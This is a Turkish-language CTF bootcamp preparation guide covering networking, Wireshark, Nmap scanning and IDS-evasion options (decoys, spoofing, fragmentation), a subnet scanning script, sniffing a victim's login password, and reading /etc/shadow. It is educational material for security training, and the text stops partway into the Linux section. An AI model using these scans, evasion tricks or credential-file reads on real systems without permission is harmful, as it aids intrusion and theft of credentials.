# CTF YÜZ YÜZE EĞİTİM HAZıRLıK REHBERİ
## 7 Günlük Siber Güvenlik Bootcamp'ine Eksiksiz Hazırlık

> *"Bir hacker olmak, sadece araç kullanmayı bilmek değil; sistemin nasıl çalıştığını, nerede kırılabileceğini ve neden kırılabileceğini anlamaktır."*

---

## 🎯 BU REHBERİN AMACI

**Durum:** CTF yarışmasında başarılı oldun ve 7 günlük yüz yüze eğitime hak kazandın.

**Eğitimde İşlenecekler:**
- Zafiyetler (Vulnerabilities)
- Açık bulma (Vulnerability Discovery)
- Cookie çalma (Session Hijacking)
- SQL Injection

**Bu Rehberin Sana Kazandıracakları:**
1. ✅ Network altyapısını **paket seviyesinde** anlayacaksın
2. ✅ Linux komutlarını **kernel mantığıyla** öğreneceksin
3. ✅ SQL injection'ı **veritabanı mimarisinden** kavrayacaksın
4. ✅ Web zafiyetlerini **HTTP protokol seviyesinde** göreceksin
5. ✅ Eğitimde **en hazırlıklı kişi** olacaksın
6. ✅ Sadece dinlemekle kalmayıp **tartışabileceksin**

> 💡 **Önemli:** Bu rehber sadece eğitime hazırlık değil, bir hackerin zihin haritasını kurmak için tasarlandı. Her konu, "neden" ve "nasıl" sorularıyla işlenecek.

---

## 📖 İÇİNDEKİLER

### BÖLÜM 1: NETWORK ALTYAPISI - PAKETİN YOLCULUĞU
- [1.1 OSI Modeli: 7 Katmanın Gerçek Anlamı](#11-osi-modeli)
- [1.2 TCP/IP: İnternet'in Omurgası](#12-tcpip)
- [1.3 IP Adresleme ve Subnetting](#13-ip-adresleme)
- [1.4 Port Kavramı ve Yaygın Portlar](#14-port-kavrami)
- [1.5 Wireshark: Paket Analizi Sanatı](#15-wireshark)
- [1.6 Nmap: Network Keşif Aracı](#16-nmap)

### BÖLÜM 2: LINUX - HACKER'IN İŞLETİM SİSTEMİ
- [2.1 Linux Neden? Unix Felsefesi](#21-linux-neden)
- [2.2 Dosya Sistemi Hiyerarşisi (FHS)](#22-dosya-sistemi)
- [2.3 En Kritik 50 Linux Komutu](#23-50-komut)
- [2.4 Dosya İzinleri ve Kullanıcı Yönetimi](#24-izinler)
- [2.5 Process Yönetimi](#25-process)
- [2.6 Bash Scripting Temelleri](#26-bash-scripting)

### BÖLÜM 3: SQL & INJECTION - VERİTABANI SALDIRI SANATI
- [3.1 SQL Temelleri: Veritabanı Mimarisi](#31-sql-temelleri)
- [3.2 SQL Injection Nedir? Mantığı Ne?](#32-sqli-mantigi)
- [3.3 SQL Injection Türleri](#33-sqli-turleri)
- [3.4 Bypass Teknikleri: WAF'leri Atlatmak](#34-bypass)
- [3.5 SQLMap: Otomatik Exploitation](#35-sqlmap)
- [3.6 Manuel Injection: Gerçek Hacker Yaklaşımı](#36-manuel-injection)

### BÖLÜM 4: WEB GÜVENLİĞİ - HTTP'NİN KARANLIK TARAFI
- [4.1 HTTP Protokolü: Request/Response Anatomisi](#41-http)
- [4.2 Cookie ve Session Yönetimi](#42-cookie-session)
- [4.3 Cookie Çalma: Session Hijacking](#43-cookie-calma)
- [4.4 XSS (Cross-Site Scripting)](#44-xss)
- [4.5 CSRF (Cross-Site Request Forgery)](#45-csrf)
- [4.6 IDOR (Insecure Direct Object Reference)](#46-idor)
- [4.7 File Upload Vulnerabilities](#47-file-upload)

### BÖLÜM 5: PHP GÜVENLİĞİ - SERVER-SIDE ZAAFLAR
- [5.1 PHP Temelleri: Kod Okuma Becerisi](#51-php-temelleri)
- [5.2 PHP Zafiyetleri: LFI, RFI, RCE](#52-php-zafiyetler)
- [5.3 PHP Code Review: Güvenlik Gözüyle Kod Okuma](#53-code-review)

### BÖLÜM 6: ZAFİYET BULMA METODOLOJİSİ
- [6.1 Reconnaissance: Bilgi Toplama](#61-recon)
- [6.2 Scanning & Enumeration](#62-scanning)
- [6.3 Vulnerability Analysis](#63-vuln-analysis)
- [6.4 Exploitation](#64-exploitation)
- [6.5 Post-Exploitation](#65-post-exploitation)

### BÖLÜM 7: ARAÇLAR VE PLATFORM
- [7.1 Burp Suite: Web Hacker'ın İsviçre Çakısı](#71-burp-suite)
- [7.2 Metasploit Framework](#72-metasploit)
- [7.3 Kali Linux: Araç Seti](#73-kali-linux)
- [7.4 CTF Platformları: Pratik Ortamlar](#74-ctf-platformlari)

### BÖLÜM 8: HACKER ZİHNİYETİ & STRATEJİ
- [8.1 CTF Yaklaşımı: Kazanma Stratejileri](#81-ctf-yaklasim)
- [8.2 Write-up Okuma Sanatı](#82-writeup)
- [8.3 Lab Ortamı Kurulumu](#83-lab-ortami)
- [8.4 Notlar ve Dokümantasyon](#84-notlar)

---

# BÖLÜM 1: NETWORK ALTYAPISI - PAKETİN YOLCULUĞU

## 1.1 OSI Modeli: 7 Katmanın Gerçek Anlamı
<a name="11-osi-modeli"></a>

### Neden OSI Modeli Öğrenmelisin?

**Hacker perspektifi:**
```
Her katman = Potansiyel saldırı yüzeyi
Katmanları anlamak = Nereden saldıracağını bilmek

Örnek:
- Layer 2 (Data Link): ARP spoofing
- Layer 3 (Network): IP spoofing
- Layer 4 (Transport): SYN flood
- Layer 7 (Application): SQL injection, XSS
```

### 7 Katmanın Detaylı Açıklaması

```
┌─────────────────────────────────────────────────────┐
│ Layer 7: APPLICATION (Uygulama Katmanı)             │
│ Protokoller: HTTP, FTP, SSH, DNS, SMTP              │
│ Veri: Mesaj                                          │
│ Saldırı: SQL Injection, XSS, Command Injection     │
├─────────────────────────────────────────────────────┤
│ Layer 6: PRESENTATION (Sunum Katmanı)               │
│ Görev: Şifreleme, sıkıştırma, format dönüşümü      │
│ Protokoller: SSL/TLS, JPEG, ASCII                   │
│ Saldırı: SSL Strip, Downgrade Attack               │
├─────────────────────────────────────────────────────┤
│ Layer 5: SESSION (Oturum Katmanı)                   │
│ Görev: Oturum kurma, sürdürme, sonlandırma         │
│ Protokoller: NetBIOS, PPTP                          │
│ Saldırı: Session Hijacking                          │
├─────────────────────────────────────────────────────┤
│ Layer 4: TRANSPORT (Taşıma Katmanı)                 │
│ Protokoller: TCP, UDP                                │
│ Veri: Segment (TCP) / Datagram (UDP)               │
│ Saldırı: SYN Flood, Port Scanning                  │
├─────────────────────────────────────────────────────┤
│ Layer 3: NETWORK (Ağ Katmanı)                       │
│ Protokoller: IP, ICMP, ARP                          │
│ Veri: Packet (Paket)                                │
│ Saldırı: IP Spoofing, ICMP Flood, ARP Poisoning    │
├─────────────────────────────────────────────────────┤
│ Layer 2: DATA LINK (Veri Bağlantı Katmanı)         │
│ Protokoller: Ethernet, Wi-Fi (802.11)               │
│ Veri: Frame (Çerçeve)                               │
│ Saldırı: MAC Spoofing, VLAN Hopping                │
├─────────────────────────────────────────────────────┤
│ Layer 1: PHYSICAL (Fiziksel Katman)                 │
│ Görev: Bitleri elektrik/ışık/radyo sinyaline çevir │
│ Veri: Bit                                            │
│ Saldırı: Kablo kesme, Jamming                      │
└─────────────────────────────────────────────────────┘
```

### Pratikte Nasıl Çalışır?

**Senaryo: Bir web sitesine bağlanıyorsun (google.com)**

```
SENİN BİLGİSAYARIN:

[Layer 7: Application]
"GET / HTTP/1.1
Host: google.com"
     ↓
[Layer 6: Presentation]
TLS ile şifrele
     ↓
[Layer 5: Session]
HTTPS oturumu kur
     ↓
[Layer 4: Transport]
TCP segment'e böl
Port: 443 (HTTPS)
     ↓
[Layer 3: Network]
IP paketine koy
Kaynak: Senin IP
Hedef: Google IP (172.217.16.142)
     ↓
[Layer 2: Data Link]
Ethernet frame'e koy
Kaynak MAC: Senin MAC
Hedef MAC: Router'ın MAC
     ↓
[Layer 1: Physical]
Elektrik sinyali olarak gönder

─────────────────────────────────

GOOGLE'IN SUNUCUSU:

[Layer 1: Physical]
Elektrik sinyali al
     ↓
[Layer 2: Data Link]
Frame'i aç, IP paketini çıkar
     ↓
[Layer 3: Network]
IP başlığını oku, TCP segment'i çıkar
     ↓
[Layer 4: Transport]
TCP segment'i birleştir, veriyi çıkar
     ↓
[Layer 5: Session]
HTTPS oturumunu doğrula
     ↓
[Layer 6: Presentation]
TLS'i çöz
     ↓
[Layer 7: Application]
HTTP isteğini işle:
"Tamam, google.com'un HTML'ini gönderiyorum"
```

### Hacker İçin Kritik Nokta: Encapsulation

```
Veri gönderirken her katman kendi başlığını ekler:

[HTTP Data]
    ↓
[TCP Header][HTTP Data]
    ↓
[IP Header][TCP Header][HTTP Data]
    ↓
[Ethernet Header][IP Header][TCP Header][HTTP Data][Ethernet Trailer]

Her başlık = Potansiyel manipülasyon noktası
```

**Wireshark'ta göreceğin şey:**

```
Frame 1: 74 bytes on wire
Ethernet II
    Destination: 00:0c:29:3e:98:7a
    Source: 00:50:56:c0:00:08
    Type: IPv4 (0x0800)
Internet Protocol Version 4
    Source: 192.168.1.100
    Destination: 172.217.16.142
Transmission Control Protocol
    Source Port: 54321
    Destination Port: 443
    Flags: SYN
Hypertext Transfer Protocol
    GET / HTTP/1.1
    Host: google.com
```

---

## 1.2 TCP/IP: İnternet'in Omurgası
<a name="12-tcpip"></a>

### TCP vs UDP: İki Kardeş, İki Karakter

```
┌──────────────────────────────────────────────────┐
│               TCP (Transmission Control Protocol) │
├──────────────────────────────────────────────────┤
│ Özellik: Bağlantı odaklı (Connection-oriented)   │
│ Güvenilirlik: %100 (kayıp paket yok)             │
│ Sıralama: Garanti                                 │
│ Hız: Yavaş (onay mekanizması var)                │
│ Kullanım: HTTP, FTP, SSH, Email                  │
│ Saldırı: SYN Flood, Session Hijacking            │
└──────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────┐
│               UDP (User Datagram Protocol)        │
├──────────────────────────────────────────────────┤
│ Özellik: Bağlantısız (Connectionless)            │
│ Güvenilirlik: Yok (paket kaybolabilir)           │
│ Sıralama: Yok                                     │
│ Hız: Hızlı (onay yok)                             │
│ Kullanım: DNS, Video streaming, VoIP, Gaming     │
│ Saldırı: UDP Flood, DNS Amplification            │
└──────────────────────────────────────────────────┘
```

### TCP 3-Way Handshake: Bağlantı Kurma Ritüeli

```
CLIENT                          SERVER
  │                                │
  │ ───── SYN ──────────────────> │  "Bağlanalım mı?"
  │     (Seq=100)                  │
  │                                │
  │ <──── SYN-ACK ────────────── │  "Tamam, ben de hazırım!"
  │     (Seq=300, Ack=101)        │
  │                                │
  │ ───── ACK ──────────────────> │  "Harika, başlayalım!"
  │     (Seq=101, Ack=301)        │
  │                                │
  │ ═════ BAĞLANTI KURULDU ═════  │
  │                                │
```

**TCP Header Anatomisi:**

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
┌───────────────────────────────┬───────────────────────────────┐
│        Source Port (16 bit)   │    Destination Port (16 bit)  │
├───────────────────────────────┴───────────────────────────────┤
│                   Sequence Number (32 bit)                     │
├────────────────────────────────────────────────────────────────┤
│                Acknowledgment Number (32 bit)                  │
├─────┬─────┬─┬─┬─┬─┬─┬─┬───────────────────────────────────────┤
│HL   │Resv │N│C│E│U│A│P│R│S│F│       Window Size (16 bit)       │
│     │     │S│W│C│R│C│S│S│Y│I│                                  │
│(4b) │(4b) │ │R│E│G│K│H│T│N│N│                                  │
├─────┴─────┴─┴─┴─┴─┴─┴─┴─┴─┴─┴───────────────────────────────┤
│           Checksum (16 bit)   │    Urgent Pointer (16 bit)    │
└───────────────────────────────┴───────────────────────────────┘
```

**Kritik flag'ler (Hacker perspektifi):**

```
SYN (Synchronize): Bağlantı başlat
    Saldırı: SYN Flood (milyonlarca SYN gönder, ACK'yi bekleme)

ACK (Acknowledgment): Onay
    Saldırı: ACK Scan (firewall bypass için)

FIN (Finish): Bağlantıyı kapat
    Saldırı: FIN Scan (gizli port tarama)

RST (Reset): Bağlantıyı zorla kes
    Saldırı: TCP Reset Attack (bağlantıyı sabote et)

PSH (Push): Veriyi hemen ilet
URG (Urgent): Acil veri var
```

### TCP Port Scanning Teknikleri

**1. SYN Scan (Stealth Scan)**

```bash
# Nmap komutu:
nmap -sS 192.168.1.100

# Ne yapar:
CLIENT                          TARGET
  │                                │
  │ ───── SYN ──────────────────> │
  │                                │
  │ <──── SYN-ACK ────────────── │  (Port açık!)
  │                                │
  │ ───── RST ──────────────────> │  (Bağlantıyı kur AMA hemen kes)
  │                                │

# Avantajı:
- Tam bağlantı kurulmaz (log'larda görünmez)
- Hızlı
- Firewall'lar göremeyebilir

# Dezavantajı:
- Root yetkisi gerekir
```

**2. TCP Connect Scan**

```bash
# Nmap komutu:
nmap -sT 192.168.1.100

# Ne yapar:
Tam 3-way handshake yapar
    ↓
Çok daha yavaş
    ↓
Log'lara düşer
    ↓
Ama root yetkisi gerektirmez
```

**3. FIN Scan (Gizli Tarama)**

```bash
# Nmap komutu:
nmap -sF 192.168.1.100

# Mantık:
- Kapalı port'a FIN gönderirsen → RST cevabı gelir
- Açık port'a FIN gönderirsen → Cevap gelmez (drop edilir)

# Avantajı:
- Bazı firewall'lar SYN'i engeller ama FIN'i geçirir
- Log'larda "yarım bağlantı" görünmez
```

---

## 1.3 IP Adresleme ve Subnetting
<a name="13-ip-adresleme"></a>

### IPv4 Anatomy

```
IP Adresi: 192.168.1.100

Binary:
192     = 11000000
168     = 10101000
1       = 00000001
100     = 01100100
          ────────────────────
Full:     11000000.10101000.00000001.01100100
```

### IP Sınıfları (Artık eskimiş ama bilmekte fayda var)

```
Class A: 0.0.0.0     - 127.255.255.255   (16 milyon host)
         Network: İlk 8 bit (N.H.H.H)
         Örnek: 10.0.0.0/8

Class B: 128.0.0.0   - 191.255.255.255   (65,000 host)
         Network: İlk 16 bit (N.N.H.H)
         Örnek: 172.16.0.0/16

Class C: 192.0.0.0   - 223.255.255.255   (254 host)
         Network: İlk 24 bit (N.N.N.H)
         Örnek: 192.168.1.0/24
```

### Subnet Mask: Network ve Host Ayırımı

```
IP:      192.168.1.100
Mask:    255.255.255.0  (/24)

Binary:
IP:      11000000.10101000.00000001.01100100
Mask:    11111111.11111111.11111111.00000000
         ─────────────────────────── ────────
         Network Kısmı (24 bit)      Host (8 bit)

Network ID:   192.168.1.0    (AND işlemi sonucu)
Broadcast:    192.168.1.255  (Tüm host bitler 1)
Kullanılabilir: 192.168.1.1 - 192.168.1.254
```

### CIDR Notasyonu: /24 Ne Demek?

```
/24 = İlk 24 bit network, son 8 bit host
    = 2^8 - 2 = 254 kullanılabilir IP
    = Subnet mask: 255.255.255.0

/16 = İlk 16 bit network, son 16 bit host
    = 2^16 - 2 = 65,534 kullanılabilir IP
    = Subnet mask: 255.255.0.0

/8  = İlk 8 bit network, son 24 bit host
    = 2^24 - 2 = 16,777,214 kullanılabilir IP
    = Subnet mask: 255.0.0.0
```

### Özel (Private) IP Aralıkları

```
10.0.0.0      - 10.255.255.255    (10.0.0.0/8)     Class A
172.16.0.0    - 172.31.255.255    (172.16.0.0/12)  Class B
192.168.0.0   - 192.168.255.255   (192.168.0.0/16) Class C

Bu IP'ler internet'te yönlendirilemez (NAT gerekir)
```

### Hacker İçin Kritik: Subnet'i Taramak

```bash
# 192.168.1.0/24 subnet'indeki tüm canlı host'ları bul:
nmap -sn 192.168.1.0/24

# Çıktı:
Nmap scan report for 192.168.1.1
Host is up (0.0010s latency).

Nmap scan report for 192.168.1.50
Host is up (0.0023s latency).

Nmap scan report for 192.168.1.100
Host is up (0.0015s latency).

# -sn: Ping scan (port tarama yok, sadece canlı mı?)
```

---

## 1.4 Port Kavramı ve Yaygın Portlar
<a name="14-port-kavrami"></a>

### Port Nedir?

**Analoji:**
```
IP Adresi = Apartman adresi
Port = Daire numarası

192.168.1.100:80   → 100 numaralı apartman, 80 numaralı daire (HTTP)
192.168.1.100:22   → Aynı apartman, 22 numaralı daire (SSH)
```

### Port Aralıkları

```
0-1023:     Well-known ports (Sistem portları)
            Örnekler: 80 (HTTP), 443 (HTTPS), 22 (SSH)
            Root yetkisi gerektirir (bind için)

1024-49151: Registered ports (Kayıtlı portlar)
            Örnekler: 3306 (MySQL), 5432 (PostgreSQL)

49152-65535: Dynamic/Private ports (Geçici portlar)
            İstemci bağlantıları için kullanılır
```

### En Kritik 50 Port (Ezberlenmesi Gereken)

```
┌──────────┬────────────────────────────────────────────┐
│   PORT   │   SERVİS / AÇIKLAMA                        │
├──────────┼────────────────────────────────────────────┤
│    20    │ FTP Data Transfer                          │
│    21    │ FTP Control (Kullanıcı adı/şifre)         │
│    22    │ SSH (Secure Shell) - Remote Access        │
│    23    │ Telnet (Şifresiz SSH, TEHLİKELİ!)        │
│    25    │ SMTP (Email gönderme)                      │
│    53    │ DNS (Domain Name System)                   │
│    80    │ HTTP (Web sunucu)                          │
│   110    │ POP3 (Email alma)                          │
│   143    │ IMAP (Email alma, gelişmiş)                │
│   443    │ HTTPS (Şifreli web)                        │
│   445    │ SMB (Windows dosya paylaşımı)              │
│   3306   │ MySQL Database                             │
│   3389   │ RDP (Windows Remote Desktop)               │
│   5432   │ PostgreSQL Database                        │
│   5900   │ VNC (Remote Desktop)                       │
│   8080   │ HTTP Alternatif (Proxy, Tomcat)           │
│   8443   │ HTTPS Alternatif                           │
└──────────┴────────────────────────────────────────────┘
```

**Hacker perspektifi: Her port = Potansiyel giriş kapısı**

```
Port 21 (FTP) açık →
    - Anonymous login dene
    - Brute-force saldırısı
    - FTP bounce attack

Port 22 (SSH) açık →
    - SSH version'ı öğren (banner grab)
    - Zayıf şifre dene
    - Public key authentication bypass

Port 80/443 (HTTP/HTTPS) açık →
    - Web zafiyet taraması
    - SQLi, XSS, LFI, RFI testi
    - Directory bruteforce

Port 3306 (MySQL) açık →
    - Remote root login dene
    - SQL injection (web üzerinden)
    - Privilege escalation
```

### Port Tarama Stratejisi

```bash
# 1. Hızlı tara (Top 1000 port):
nmap -F 192.168.1.100

# 2. Yaygın portları tara:
nmap --top-ports 100 192.168.1.100

# 3. Tüm portları tara (yavaş):
nmap -p- 192.168.1.100

# 4. Servisleri tespit et:
nmap -sV -p 80,443,22 192.168.1.100

# Çıktı:
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.9p1
80/tcp  open  http    Apache httpd 2.4.41
443/tcp open  https   Apache httpd 2.4.41
```

---

## 1.5 Wireshark: Paket Analizi Sanatı
<a name="15-wireshark"></a>

### Wireshark Nedir ve Neden Önemli?

```
Wireshark = Network'teki her şeyi gören "X-Ray"

Görebileceğin şeyler:
- HTTP istekleri (POST veri, GET parametreleri)
- Şifrelenmemiş parolalar (FTP, Telnet, HTTP Basic Auth)
- Cookie değerleri
- DNS sorguları
- TCP handshake'ler
- ARP paketleri
```

### Temel Wireshark Arayüzü

```
┌────────────────────────────────────────────────────────┐
│  File  Edit  View  Go  Capture  Analyze  Statistics   │
├────────────────────────────────────────────────────────┤
│  [Filter: http]                            [Apply]     │
├────────────────────────────────────────────────────────┤
│ No. │ Time  │ Source      │ Destination │ Protocol │  │
├─────┼───────┼─────────────┼─────────────┼──────────┤  │
│  1  │ 0.000 │ 192.168.1.5 │ 8.8.8.8     │ DNS      │  │
│  2  │ 0.123 │ 192.168.1.5 │ 74.6.231.21 │ TCP      │  │
│  3  │ 0.234 │ 192.168.1.5 │ 74.6.231.21 │ HTTP     │  │
├────────────────────────────────────────────────────────┤
│ Frame Details:                                          │
│ ▼ Ethernet II                                           │
│ ▼ Internet Protocol Version 4                          │
│ ▼ Transmission Control Protocol                        │
│ ▼ Hypertext Transfer Protocol                          │
│     GET /index.php?user=admin HTTP/1.1                 │
│     Host: example.com                                   │
│     Cookie: sessionid=abc123; admin=true               │
└────────────────────────────────────────────────────────┘
```

### En Kritik Wireshark Filtreleri

**1. Protokol Filtreleri:**

```
http                    # Sadece HTTP trafiği
https                   # HTTPS trafiği (şifrelenmiş, içini göremezsin)
dns                     # DNS sorguları
tcp                     # TCP trafiği
udp                     # UDP trafiği
arp                     # ARP paketleri
```

**2. IP Filtreleri:**

```
ip.src == 192.168.1.100         # Kaynak IP
ip.dst == 192.168.1.1           # Hedef IP
ip.addr == 192.168.1.100        # Kaynak VEYA hedef IP
```

**3. Port Filtreleri:**

```
tcp.port == 80                  # 80 portu (HTTP)
tcp.dstport == 443              # Hedef port 443 (HTTPS)
tcp.srcport == 12345            # Kaynak port 12345
```

**4. HTTP Filtreleri (ÇOK ÖNEMLİ):**

```
http.request.method == "POST"   # POST istekleri
http.request.uri contains "login"  # URL'de "login" geçenler
http.cookie                     # Cookie içeren paketler
http.request.method == "GET"    # GET istekleri
http.response.code == 200       # Başarılı HTTP cevapları
```

**5. TCP Flag Filtreleri:**

```
tcp.flags.syn == 1              # SYN flag'i set
tcp.flags.ack == 1              # ACK flag'i set
tcp.flags.reset == 1            # RST flag'i set
tcp.flags.syn == 1 && tcp.flags.ack == 0  # Sadece SYN (port scan?)
```

**6. Veri İçeriği Filtreleri:**

```
frame contains "password"       # Paket içinde "password" geçenler
http.request.uri contains "admin"  # URL'de "admin" geçenler
tcp contains "admin"            # TCP verisi içinde "admin"
```

### Pratik Senaryo: HTTP POST İsteğinde Parolayı Yakalama

```
1. Wireshark'ı başlat
2. Interface seç (Wi-Fi veya Ethernet)
3. Filtre: http.request.method == "POST"
4. Kurban bir login formuna giriyor...
5. Wireshark'ta paketi yakala:

Paket detayı:
POST /login.php HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

username=admin&password=12345  ← ŞİFRE AÇIKTA!
```

### Follow TCP Stream: Konuşmanın Tamamını Gör

```
1. Wireshark'ta bir HTTP paketine sağ tıkla
2. "Follow" → "TCP Stream"
3. Tüm konuşma açılır:

CLIENT:
GET /admin/dashboard.php HTTP/1.1
Host: example.com
Cookie: PHPSESSID=abc123def456
User-Agent: Mozilla/5.0...

SERVER:
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: admin=true; path=/

<html>
<body>
Welcome Admin!
...
</body>
</html>
```

---

## 1.6 Nmap: Network Keşif Aracı
<a name="16-nmap"></a>

### Nmap'in Gücü

```
Nmap = Network Mapper
En güçlü network keşif ve port tarama aracı

Yapabilecekleri:
✓ Port tarama (açık/kapalı portlar)
✓ Servis tespiti (Apache 2.4.41, OpenSSH 7.9)
✓ İşletim sistemi tespiti
✓ Zafiyet taraması (NSE scriptleri ile)
✓ Firewall/IDS bypass
```

### Temel Nmap Kullanımı

**1. Basit Port Tarama:**

```bash
# Hedefin en yaygın 1000 portunu tara:
nmap 192.168.1.100

# Çıktı:
Starting Nmap 7.92
Nmap scan report for 192.168.1.100
Host is up (0.00023s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address scanned in 0.52 seconds
```

**2. Belirli Portları Tara:**

```bash
# Tek port:
nmap -p 80 192.168.1.100

# Birden fazla port:
nmap -p 22,80,443 192.168.1.100

# Port aralığı:
nmap -p 1-1000 192.168.1.100

# Tüm portlar (0-65535):
nmap -p- 192.168.1.100
```

**3. Servis Versiyonu Tespit Et:**

```bash
nmap -sV 192.168.1.100

# Çıktı:
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.38 ((Debian))
443/tcp open  ssl/http Apache httpd 2.4.38 ((Debian))
```

**4. İşletim Sistemi Tespit Et:**

```bash
nmap -O 192.168.1.100

# Çıktı:
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11
```

**5. Agresif Tarama (Herşey):**

```bash
nmap -A 192.168.1.100

# -A: OS detection + version detection + script scanning + traceroute
```

### Nmap Scan Türleri (Hacker Bakış Açısı)

**1. SYN Scan (Stealth - Gizli):**

```bash
nmap -sS 192.168.1.100

# Neden "stealth"?
- Tam bağlantı kurulmaz
- Log'lara düşmeyebilir
- Hızlı

# Dezavantaj:
- Root yetkisi gerekir
```

**2. TCP Connect Scan:**

```bash
nmap -sT 192.168.1.100

# Tam 3-way handshake
# Root gerekmez
# Ama log'lara düşer
```

**3. UDP Scan:**

```bash
nmap -sU 192.168.1.100

# UDP portlarını tara (DNS:53, SNMP:161)
# Çok yavaş!
```

**4. ACK Scan (Firewall Bypass):**

```bash
nmap -sA 192.168.1.100

# Firewall kurallarını test et
# Port açık mı kapalı mı bilmez
# Ama firewall filtered mı değil mi gösterir
```

### NSE (Nmap Scripting Engine): Zafiyet Tarama

```bash
# Tüm güvenlik scriptlerini çalıştır:
nmap -sV --script=vuln 192.168.1.100

# Örnek çıktı:
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18
|_http-vuln-cve2017-5638: Vulnerable to Apache Struts RCE!
|_http-dombased-xss: Vulnerable to DOM-based XSS
|_http-sql-injection: Possible SQL injection in parameter 'id'

# Belirli bir script:
nmap --script=http-sql-injection 192.168.1.100

# SMB zafiyet tarama:
nmap --script=smb-vuln* 192.168.1.100
```

### Nmap Timing (Hız vs Gizlilik)

```bash
# -T0: Paranoid (çok yavaş, IDS bypass)
nmap -T0 192.168.1.100

# -T1: Sneaky (yavaş, gizli)
nmap -T1 192.168.1.100

# -T2: Polite (nazik, bant genişliği korur)
nmap -T2 192.168.1.100

# -T3: Normal (varsayılan)
nmap -T3 192.168.1.100

# -T4: Aggressive (hızlı)
nmap -T4 192.168.1.100

# -T5: Insane (çok hızlı, paket kaybı olabilir)
nmap -T5 192.168.1.100
```

### Firewall/IDS Bypass Teknikleri

**1. Decoy (Sahte IP'ler):**

```bash
nmap -D RND:10 192.168.1.100

# 10 rastgele IP ile tarama yap
# Gerçek IP'nin hangisi olduğu belli olmaz
```

**2. Fragment Paketleri:**

```bash
nmap -f 192.168.1.100

# Paketleri küçük parçalara böl
# Bazı firewall'lar atlar
```

**3. IP Spoofing:**

```bash
nmap -S 192.168.1.50 192.168.1.100

# Kaynak IP'yi 192.168.1.50 olarak göster
```

**4. MAC Address Spoofing:**

```bash
nmap --spoof-mac 0 192.168.1.100

# Rastgele MAC adresi kullan
```

### Pratik Senaryo: Bir Subnet'i Tam Tarama

```bash
#!/bin/bash
# full_scan.sh

TARGET="192.168.1.0/24"
OUTPUT="scan_results.txt"

echo "[*] Starting comprehensive scan on $TARGET"

# 1. Ping sweep (canlı host'ları bul)
echo "[+] Finding live hosts..."
nmap -sn $TARGET -oG - | grep "Up" | cut -d " " -f 2 > live_hosts.txt

# 2. Her canlı host için detaylı tarama
while read host; do
    echo "[+] Scanning $host..."
    
    # Port tarama + servis tespiti
    nmap -sS -sV -O -p- -T4 $host -oN ${host}_detailed.txt
    
    # Zafiyet tarama
    nmap --script=vuln $host -oN ${host}_vulns.txt
done < live_hosts.txt

echo "[*] Scan complete! Check *_detailed.txt and *_vulns.txt files."
```

---

# BÖLÜM 2: LINUX - HACKER'IN İŞLETİM SİSTEMİ

## 2.1 Linux Neden? Unix Felsefesi
<a name="21-linux-neden"></a>

### Neden Hacker'lar Linux Kullanır?

```
1. Açık Kaynak:
   - Kernel kodunu görebilirsin
   - Nasıl çalıştığını anlarsın
   - Exploit geliştirirken avantaj

2. Terminal Gücü:
   - GUI değil, komut satırı
   - Otomasyon kolay
   - Uzaktan yönetim (SSH)

3. Araç Zenginliği:
   - Nmap, Metasploit, Burp Suite, Wireshark
   - Hepsi Linux için optimize

4. İzin Sistemi:
   - Detaylı kullanıcı kontrolü
   - Root yetkisi kavramı
   - Privilege escalation öğrenmek için ideal

5. Lightweight:
   - Düşük kaynak tüketimi
   - Eski bilgisayarlarda çalışır
   - Sunucularda yaygın
```

### Unix Felsefesi (Hacker Zihniyeti)

```
1. "Do one thing and do it well"
   Her program tek bir işi mükemmel yapar
   
   Örnek:
   ls  → Dosyaları listele
   grep → Metin ara
   cat → Dosya içeriğini göster
   
   Güç: Bunları birleştir!
   ls | grep ".txt" → Sadece .txt dosyaları

2. "Everything is a file"
   Her şey bir dosyadır
   
   /dev/sda  → Hard disk
   /dev/null → Çöp kutusu
   /proc/cpuinfo → CPU bilgisi
   
   Avantaj: Tüm şeyleri dosya gibi yönetebilirsin

3. "Use text streams"
   Veri text olarak akar
   
   command1 | command2 | command3
   
   Her komut text alır, text verir
   Birleştirilebilir (composable)
```

---

## 2.2 Dosya Sistemi Hiyerarşisi (FHS)
<a name="22-dosya-sistemi"></a>

### Linux Dizin Yapısı

```
/
├── bin/         → Temel komutlar (ls, cat, cp)
├── boot/        → Kernel ve boot dosyaları
├── dev/         → Cihaz dosyaları (hard disk, USB)
├── etc/         → Konfigürasyon dosyaları
│   ├── passwd   → Kullanıcı listesi
│   ├── shadow   → Şifreli parolalar
│   └── hosts    → IP-hostname eşleşmesi
├── home/        → Kullanıcı dizinleri
│   └── user/    → Normal kullanıcı
├── root/        → Root kullanıcısının home'u
├── tmp/         → Geçici dosyalar (herkes yazabilir!)
├── var/         → Değişken veri (log'lar)
│   ├── log/     → Sistem log'ları
│   └── www/     → Web sunucu dosyaları
├── usr/         → Kullanıcı programları
│   ├── bin/     → Kullanıcı komutları
│   └── local/   → Yerel kurulumlar
└── proc/        → Kernel bilgileri (virtual)
    ├── cpuinfo  → CPU bilgisi
    └── meminfo  → RAM bilgisi
```

### Hacker İçin Kritik Dizinler

**1. /etc/passwd ve /etc/shadow**

```bash
# /etc/passwd: Kullanıcı bilgileri (herkese okunabilir)
cat /etc/passwd

# Çıktı:
root:x:0:0:root:/root:/bin/bash
user:x:1000:1000:User:/home/user:/bin/bash
mysql:x:111:116:MySQL Server:/nonexistent:/bin/false

# Format:
# username:password:UID:GID:comment:home:shell
#          ↑
#       "x" = Şifre /etc/shadow'da

# /etc/shadow: Şifreli parolalar (sadece root okuyabilir)
sudo cat /etc/shadow

# Çıktı:
